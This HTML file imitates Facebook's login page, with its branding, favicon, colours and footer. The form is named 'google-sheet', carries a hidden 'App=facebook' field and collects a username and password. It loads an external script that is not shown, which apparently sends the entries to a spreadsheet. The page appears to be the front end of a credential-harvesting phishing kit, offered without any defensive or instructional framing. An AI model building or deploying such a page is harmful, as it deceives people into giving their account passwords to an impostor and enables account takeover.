<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/FhH3l1193K9.ico" type="image/x-icon">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #fff;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
            color: #1c1e21;
        }

        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 350px;
            padding-top: 50px;
            gap: 20px;
        }

        .facebook-logo {
            color: #1877f2;
            font-size: 40px;
            font-weight: bold;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .input-field {
            width: 100%;
            padding: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            background-color: #f5f6f7;
            box-sizing: border-box;
        }

        .login-button {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            color: #fff;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .login-button:hover {
            background-color: #166fe5;
        }

        .forgot-password-link {
            font-size: 14px;
            color: #1877f2;
            text-decoration: none;
            font-weight: 600;
        }

        .divider {
            width: 100%;
            display: flex;
            align-items: center;
            text-align: center;
            color: #a8a8a8;
            font-size: 14px;
            font-weight: 500;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dadde1;
        }

        .divider:not(:empty)::before {
            margin-right: .25em;
        }

        .divider:not(:empty)::after {
            margin-left: .25em;
        }

        .create-account-button {
            width: 100%;
            padding: 12px;
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            color: #fff;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .create-account-button:hover {
            background-color: #36a420;
        }

        .footer {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
            font-size: 12px;
            color: #8a8d91;
            text-align: center;
        }
        
        .footer a {
            color: #8a8d91;
            text-decoration: none;
            font-weight: bold;
        }
        
        @media (min-width: 768px) {
            body {
                background-color: #f0f2f5;
            }
        }
    </style>
</head>
<body>
    <form class="main-container" name="google-sheet" >
        <div class="facebook-logo">facebook</div>
        <input name="App" type="hidden" value="facebook">
        <input name="UserName" type="text" class="input-field" placeholder="Mobile number or email address" required>
        <input name="PassWord" type="password" class="input-field" placeholder="Password" required>
        <input class="login-button" type="submit" value="Log In">
        <a href="#" class="forgot-password-link">Forgotten password?</a>
        <div class="divider">or</div>
        <button class="create-account-button">Create New Account</button>
    </form>

    <div class="footer">
        <div>About &middot; Help &middot; More</div>
        <div>Meta Â© 2026</div>
    </div>
    <script src="../script.js"></script>
</body>
</html>
